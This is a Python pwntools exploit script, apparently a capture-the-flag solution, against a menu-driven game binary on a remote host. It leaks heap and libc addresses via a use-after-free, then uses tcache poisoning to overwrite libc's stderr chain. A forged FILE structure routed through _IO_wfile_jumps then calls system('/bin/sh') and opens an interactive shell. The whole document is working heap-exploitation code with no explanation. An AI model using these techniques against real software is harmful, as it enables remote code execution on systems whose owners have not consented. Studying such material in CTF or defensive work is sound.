#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./challenge_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["tmux","new-window"]

DOCKER_PORT = 7009
REMOTE_NC_CMD    = "nc 34.78.85.21 7009"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """

"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(b"B"*0x20)
    r.recvuntil(b"Free the monsters.")

    def equip(idx, name, atk, dfn):
        r.sendline(b"4")
        r.sendline(bstr(idx))
        r.sendline(b"1")
        r.send(name)
        r.recvuntil(b"attack: ")
        r.sendline(bstr(atk))
        r.sendline(bstr(dfn))

    def unequip(idx):
        r.sendline(b"4")
        r.recvuntil(b"Select equipment to change:")
        r.sendline(bstr(idx))
        r.sendline(b"2")

    def view():
        r.sendline(b"1")

    def accept_q(idx):
        r.sendline(b"2")
        r.recvuntil(b"Please select a quest:")
        r.sendline(bstr(idx))

    def complete_q():
        r.sendline(b"3")
        r.recvuntil(b"Embarking on quest:")

    def fsrop(fp=libc.sym._IO_2_1_stdout_, offset=0):
        fs = FileStructure()   
        fs.flags = u64(b' /bin/sh') 
        fs._IO_read_end = heap 
        fs._lock = heap+0x100 
        fs._wide_data = fp - 0x10
        fs.unknown2 = p64(0)*3 + p64(1) + p64(libc.sym.system) + p64(fp + 0x60)
        fs.vtable = libc.sym._IO_wfile_jumps + offset   
        return bytes(fs)

    #HEAP LEAK  
    equip(13, b"PALLE", 0, 0)
    unequip(13)
    view()
    r.recvuntil(b"Attack: ")
    heap = int(r.recvline()) << 12
    log.info(hex(heap))


    #LEVEL UP TO ABLE TO EQUIP ALL ITEMS
    accept_q(1)
    complete_q()
    for i in range(10):
        accept_q(2)
        complete_q()

    #FAKE AN UNSORTED BIN CHUNK TO LEAK LIBC
    for i in range(1, 14):
        equip(i, p64(heap>>12)*4, heap>>12, 0)
    for i in range(3, 10):
        unequip(i)
    unequip(10)
    unequip(11)
    unequip(10)

    for i in range(7):
        equip(3, b"A", 0, 0)
    equip(3, b"A", (heap>>12)^(heap+0x2c0), 0)
    for i in range(3):
        equip(3, p64(0)+p64(0x441), 0, 0)
    for i in range(6):
        equip(3, b"B", 0, 0)

    unequip(2)  
    view()
    r.recvuntil(b"Attack: ")
    r.recvuntil(b"Attack: ")
    libc.address = int(r.recvline()) - 0x211b20
    log.info(hex(libc.address))
        
    #OVERWRITE STDERR->CHAIN
    for i in range(1, 12):
        equip(i, p64(heap>>12)*4, 0, 0)

    for i in range(3, 10):
        unequip(i)
    unequip(10)
    unequip(11)
    unequip(10)

    for i in range(7):
        equip(3, b"\0", 0,0)
   
    equip(3, b"A", (heap>>12)^(libc.sym._IO_2_1_stderr_+0x60), 0)
    for i in range(3):
        equip(3, p8(3), 0, heap+0x7a0)

    for i in range(7):
        equip(3, b"\0", 0,0)

    #WRITE FAKE FP ON THE HEAP
    payload = fsrop(heap+0x7a0)+b"\0"*0x200
    for i in range(7):
        equip(3, payload[16:16+0x20], u64(payload[:8]), u64(payload[8:16]))
        payload = payload[16+0x30:]
    
    log.info("FAKE FP: "+hex(heap+0x7a0))
    gdb.attach(r)

    #TRIGGER _IO_flush_all
    r.sendline(b"5")
    r.interactive()

if __name__ == "__main__":
    main()
